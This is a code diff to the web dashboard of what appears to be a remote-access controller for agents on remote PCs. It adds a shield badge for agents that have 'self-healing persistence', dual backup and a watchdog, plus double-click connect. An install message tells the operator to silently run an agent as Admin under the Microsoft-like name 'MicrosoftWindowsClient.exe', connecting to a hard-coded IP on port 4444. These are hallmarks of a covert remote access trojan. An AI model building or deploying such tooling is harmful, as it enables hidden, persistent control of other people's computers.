@@ -413,6 +413,11 @@ function toast(msg, cls=""){
 }
 function needAgent(){ if(!selected){ toast("No agent selected — connect one first", "err"); return false; } return true; }
 
+// protOK: agent carries watchdog v2+ (dual backup, self-healing persistence,
+// health heartbeat) when its hello version is >= 1.40.6. Inferred from the
+// version string so no protocol change is needed.
+function protOK(v){ const m=String(v||"").match(/(\d+)\.(\d+)\.(\d+)/); if(!m) return false; const a=+m[1],b=+m[2],c=+m[3]; return a>1||(a===1&&(b>40||(b===40&&c>=6))); }
+
 // Connects list (stable selection: keep current unless it vanished)
 function renderConns(filter=""){
   if(selected && !agents.find(a=>a.id===selected.id)) selected = agents[0]||null;
@@ -425,9 +430,10 @@ function renderConns(filter=""){
     const seen=off?(" • "+seenText(a.seenAgoSec)):("");
     d.className="conn-item"+(selected?.id===a.id?" active":"")+(off?" offline":"");
     const lat = (a.latency==null||a.latency>900000) ? "--" : a.latency;
-    const ver=a.version?` • ${a.version}`:""; const upd=a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:"";
-    d.innerHTML=`<span class="conn-dot ${a.connected?"dot-online":"dot-offline"}"></span><div class="conn-meta"><div class="conn-name">${a.hostname}${upd}</div><div class="conn-sub">${a.id} • ${a.user}${a.remote?" • "+a.remote:""}${a.e2e?" • 🔒":""}${ver}${seen}</div></div>${off?'<span class="forgetbtn" title="Forget (remove from controller)" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">✕</span>':""}<span class="copybtn" title="Copy hostname" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">⧉</span><span class="conn-lat">${lat}ms</span>`;
+    const ver=a.version?` • ${a.version}`:""; const upd=a.outdated?` <span style="color:#FFD54F" title="Outdated — click Update All">⇪</span>`:""; const prot=protOK(a.version)?` <span title="Self-healing protection: dual backup + watchdog + health heartbeat">🛡</span>`:"";
+    d.innerHTML=`<span class="conn-dot ${a.connected?"dot-online":"dot-offline"}"></span><div class="conn-meta"><div class="conn-name">${a.hostname}${upd}${prot}</div><div class="conn-sub">${a.id} • ${a.user}${a.remote?" • "+a.remote:""}${a.e2e?" • 🔒":""}${ver}${seen}</div></div>${off?'<span class="forgetbtn" title="Forget (remove from controller)" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">✕</span>':""}<span class="copybtn" title="Copy hostname" style="font-size:11px;color:#888;cursor:pointer;padding:2px 4px">⧉</span><span class="conn-lat">${lat}ms</span>`;
     d.onclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons();};
+    d.ondblclick=()=>{selected=a; renderConns($("connFilter").value); updateActive(); renderDeviceSwitch(); if(typeof updateConnButtons==="function") updateConnButtons(); const cb=$("connectBtn"); if(cb&&cb.onclick) cb.onclick();};
     const cp=d.querySelector(".copybtn");
     if(cp) cp.onclick=(ev)=>{ ev.stopPropagation(); const t=a.hostname||a.id; if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(t).then(()=>toast("Copied "+t)).catch(()=>toast("Copy failed","err")); else toast("Copy unavailable here","err"); };
     const fb=d.querySelector(".forgetbtn");
@@ -528,7 +534,7 @@ function connectWS(){
               const ok=cv&&mv[1]===cv;
               addTerm(`Agent ${mv[1]} vs controller ${cv||"?"} — ${ok?"up to date ✓":"UPDATE AVAILABLE"}`, ok?"out":"err");
               toast(ok?"Agent up to date":"Agent outdated: "+mv[1]+" — push update?", ok?"":"err");
-              if(badge){ badge.textContent=ok?("agent v"+mv[1]):("agent v"+mv[1]+" — UPDATE"); badge.style.color=ok?"#888":"#FFD54F"; }
+              if(badge){ const sh=protOK(mv[1])?" 🛡":""; badge.textContent=ok?("agent v"+mv[1]+sh):("agent v"+mv[1]+" — UPDATE"); badge.style.color=ok?"#888":"#FFD54F"; badge.title=protOK(mv[1])?"Self-healing protection active":"No self-healing (update the agent)"; }
             }
           }
           let line=`[${m.id||selected?.id||"agent"}] ${m.data||m.error||""}`;
@@ -1462,7 +1468,7 @@ $("removeBtn").onclick=()=>{
 };
 $("installBtn").onclick=()=>{
   addTerm("Install: copy Agent-Setup.exe to remote PC and run as Admin (silent). Or run: MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt", "out");
-  window.open("https://github.com/gibishahar-sudo/Controller-/releases/tag/v1.3.0", "_blank");
+  window.open("https://github.com/gibishahar-sudo/Controller-/releases/latest", "_blank");
 };
 $("reconnectBtn").onclick=()=>{
   addTerm("Reconnecting (re-dialing relays, re-measuring brokers)...", "out");
